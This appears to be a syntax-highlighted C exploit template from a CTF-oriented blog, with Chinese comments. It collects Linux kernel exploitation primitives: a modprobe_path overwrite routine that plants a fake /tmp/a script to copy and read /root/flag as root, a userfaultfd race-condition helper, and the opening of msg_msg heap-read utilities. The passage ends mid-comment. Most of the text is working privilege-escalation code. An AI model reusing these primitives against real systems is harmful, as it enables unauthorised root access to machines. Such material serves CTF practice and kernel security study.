class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables</span></span><br><span class="line"><span class="comment"> * 定义使用到的全局变量</span></span><br><span class="line"><span class="comment"> * 使用 gXXX 统一命名，避免与局部变量命名冲突</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> gfd1, gfd2, gfd3, gfd4;</span><br><span class="line"><span class="type">void</span> *gaddr1, *gaddr2, *gaddr3, *gaddr4;</span><br><span class="line"><span class="type">uint64_t</span> glen1, glen2, glen3, glen4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Structures</span></span><br><span class="line"><span class="comment"> * 定义辅助结构体</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Macros</span></span><br><span class="line"><span class="comment"> * 定义辅助宏</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(!(cond)) \</span></span><br><span class="line"><span class="meta">    &#123; \</span></span><br><span class="line"><span class="meta">        printf(<span class="string">&quot;Line:%d: &#x27;%s&#x27; assertion failed\n&quot;</span>, \</span></span><br><span class="line"><span class="meta">               __LINE__, #cond); \</span></span><br><span class="line"><span class="meta">        perror(#cond); \</span></span><br><span class="line"><span class="meta">        fflush(stdout); \</span></span><br><span class="line"><span class="meta">        exit(EXIT_FAILURE); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">    ((size_t) &amp;((TYPE*)0)-&gt;MEMBER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __X32_SYSCALL_BIT   0x40000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_x32(nr, args...) \</span></span><br><span class="line"><span class="meta">    syscall((nr) + __X32_SYSCALL_BIT, ##args)</span></span><br><span class="line"><span class="comment">/* 在/usr/include/x86_64-linux-gnu/bits/syscall.h中</span></span><br><span class="line"><span class="comment"> * 查看x64下的系统调用信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_x64(nr, args...) \</span></span><br><span class="line"><span class="meta">    syscall((nr), ##args)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* modprobe_path提权</span></span><br><span class="line"><span class="comment"> * 条件:</span></span><br><span class="line"><span class="comment"> *      1. 覆写`modprobe_path`符号的内容从`/sbin/modprobe`</span></span><br><span class="line"><span class="comment"> * 更改为 `/tmp/a`, 即 *(modprobe_path) = 0x612f706d742f</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参考:</span></span><br><span class="line"><span class="comment"> * https://www.anquanke.com/post/id/232545#h3-6</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">modprobe_exp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] set fake modprobe content\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/a&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;cp /root/flag /tmp/flag&#x27; &gt;&gt; /tmp/a&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /tmp/flag&#x27; &gt;&gt; /tmp/a&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] set fake modprobe permission\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/a&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] set unknown file content\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] set unknown file permission\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] run unknown file\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] read the flag\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* userfaultfd条件竞争</span></span><br><span class="line"><span class="comment"> * 条件:</span></span><br><span class="line"><span class="comment"> *      1. userfaultfd机制被启用</span></span><br><span class="line"><span class="comment"> *      2. userfaultfd保护机制被关闭，即</span></span><br><span class="line"><span class="comment"> * /proc/sys/vm/unprivileged_userfaultfd 被设置为1</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. userfaultfd_exp():@addr是通过</span></span><br><span class="line"><span class="comment"> * mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE</span></span><br><span class="line"><span class="comment">        | MAP_ANONYMOUS, -1, 0) 申请的，此时内核仅仅分配了页表，</span></span><br><span class="line"><span class="comment"> * 并未分配物理页进行映射</span></span><br><span class="line"><span class="comment"> *      2. userfaultfd_exp():@len为通过mmap申请@addr时，传入的@len值</span></span><br><span class="line"><span class="comment"> *      3. userfaultfd_exp():@thread为自定义的进程 handler，其用于与内核进行交互，</span></span><br><span class="line"><span class="comment"> * 从而触发page fault</span></span><br><span class="line"><span class="comment"> *      3. userfaultfd_exp():@handler为自定义的userfaultfd handler，</span></span><br><span class="line"><span class="comment"> * 其会在内核进程触发page fault时，在userfaultfd_handler中被调用。</span></span><br><span class="line"><span class="comment"> * 其接受@page为参数，@page页内容在调用完@handler后，被用于初始化分配给内核进程的页</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值:</span></span><br><span class="line"><span class="comment"> *      1. userfaultfd_exp():@ret返回@thread创建的pthread_t，用于进程同步. </span></span><br><span class="line"><span class="comment"> * 在直白一些，通过调用pthread_join(@ret)，确保@thread已经触发page fault，</span></span><br><span class="line"><span class="comment"> * 并且@handler已经被执行结束</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参考:</span></span><br><span class="line"><span class="comment"> * https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffd_arg</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> uffd;                       <span class="comment">/* 在userfaultfd_exp()中的uffd局部变量 */</span></span><br><span class="line">    <span class="type">void</span> *(*handler)(<span class="type">void</span> *page);   <span class="comment">/* 在userfaultfd_handler()中，执行的用户自定义</span></span><br><span class="line"><span class="comment">                                     * handler, 其中参数@page内容将在userfaultfd_handler()</span></span><br><span class="line"><span class="comment">                                     * 中，被用于初始化触发page fault的页 */</span></span><br><span class="line">    <span class="type">int</span> pg_size;                    <span class="comment">/* 即页的大小 */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> * <span class="title function_">userfaultfd_handler</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_arg</span> *<span class="title">uffd_arg</span> =</span> arg;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] create the page\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(page == <span class="literal">NULL</span>)</span><br><span class="line">        assert((page = mmap(<span class="literal">NULL</span>, uffd_arg-&gt;pg_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                            MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>))</span><br><span class="line">                != MAP_FAILED);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] wait for event\n&quot;</span>);</span><br><span class="line">        pollfd.fd = uffd_arg-&gt;uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        assert(poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] read the event\n&quot;</span>);</span><br><span class="line">        assert(read(uffd_arg-&gt;uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) != <span class="number">0</span>);</span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] execute user-defined handler\n&quot;</span>);</span><br><span class="line">        (*uffd_arg-&gt;handler)(page);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] handle page fault\n&quot;</span>);</span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(uffd_arg-&gt;pg_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = uffd_arg-&gt;pg_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        assert(ioctl(uffd_arg-&gt;uffd, UFFDIO_COPY, &amp;uffdio_copy) != <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">pthread_t</span> <span class="title function_">userfaultfd_exp</span><span class="params">(<span class="type">void</span> *addr, <span class="type">uint64_t</span> len, <span class="type">void</span> *(*thread)(<span class="type">void</span> *arg),</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> *(*handler)(<span class="type">void</span> *page))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_arg</span>* <span class="title">uffd_arg</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> PG_SIZE = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] create userfaultfd object\n&quot;</span>);</span><br><span class="line">    assert((uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] set the userfaultfd api\n&quot;</span>);</span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    assert(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] register the memory range\n&quot;</span>);</span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = (len + PG_SIZE - <span class="number">1</span>) / PG_SIZE * PG_SIZE;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    assert(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] create the thread to handle userfaultfd events\n&quot;</span>);</span><br><span class="line">    assert((uffd_arg = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*uffd_arg))) != <span class="literal">NULL</span>);</span><br><span class="line">    uffd_arg-&gt;uffd = uffd;</span><br><span class="line">    uffd_arg-&gt;handler = handler;</span><br><span class="line">    uffd_arg-&gt;pg_size = PG_SIZE;</span><br><span class="line">    assert(pthread_create(&amp;thr, <span class="literal">NULL</span>, userfaultfd_handler, uffd_arg) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] create the thread to trigger the page fault\n&quot;</span>);</span><br><span class="line">    assert(pthread_create(&amp;thr, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> thr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct msg_msg读</span></span><br><span class="line"><span class="comment"> * 结构体:</span></span><br><span class="line"><span class="comment"> *          struct msg_msg &#123;</span></span><br><span class="line"><span class="comment"> *              struct list_head m_list;</span></span><br><span class="line"><span class="comment"> *              long m_type;</span></span><br><span class="line"><span class="comment"> *              size_t m_ts;    // message text大小</span></span><br><span class="line"><span class="comment"> *              struct msg_msgseg *next;</span></span><br><span class="line"><span class="comment"> *              void *security; // 由于未开启SELinux，该字段恒为0</span></span><br><span class="line"><span class="comment"> *              // 用户定义数据从这里开始</span></span><br><span class="line"><span class="comment"> *          &#125;;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 条件:</span></span><br><span class="line"><span class="comment"> *      1. 驱动中存在UAF，块大小为[0x30, 0x2000]，可以更改内存的[0x18, 0x28)处的值</span></span><br><span class="line"><span class="comment"> *      2. 如果更改了内存的[0x0, 0x10)的值，则需要调用recv_msg()，其需要内核</span></span><br><span class="line"><span class="comment"> * 开启CONFIG_CHECKPOINT_RESTORE设置；否则调用recv_msg_nocopy()即可</span></span><br><span class="line"><span class="comment"> *      3. recv_msg()读取信息时，需要和struct msg_msg的m_ts相同大小，否则会</span></span><br><span class="line"><span class="comment"> * 返回异常</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. send_msg():@size，指内核态申请的内存大小，其会包含0x30的</span></span><br><span class="line"><span class="comment"> * struct msg_msg头</span></span><br><span class="line"><span class="comment"> *      2. send_msg():@content, 即用户定义的消息内容，其会被复制到</span></span><br><span class="line"><span class="comment"> * 内核态申请的内存中，主要用来查找这部分内存，可以设置为标志性字符串，如</span></span><br><span class="line"><span class="comment"> * &quot;hhaawwkk1&quot;等</span></span><br><span class="line"><span class="comment"> *      3. recv_msg*():@qid，消息队列id，用来标识不同队列，是send_msg()</span></span><br><span class="line"><span class="comment"> * 返回值</span></span><br><span class="line"><span 